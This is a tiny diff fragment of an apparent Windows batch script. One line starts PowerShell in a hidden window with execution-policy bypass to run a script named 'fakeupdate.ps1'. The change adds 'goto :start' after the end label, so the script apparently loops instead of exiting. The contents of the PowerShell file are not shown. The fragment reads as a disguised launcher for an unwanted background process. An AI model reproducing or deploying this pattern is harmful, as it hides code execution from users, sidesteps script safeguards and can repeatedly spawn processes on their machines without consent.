@@ -75,4 +75,5 @@ goto:nome
 start powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "fakeupdate.ps1"
 goto:end
 
-:end       
+:end  
+goto :start     
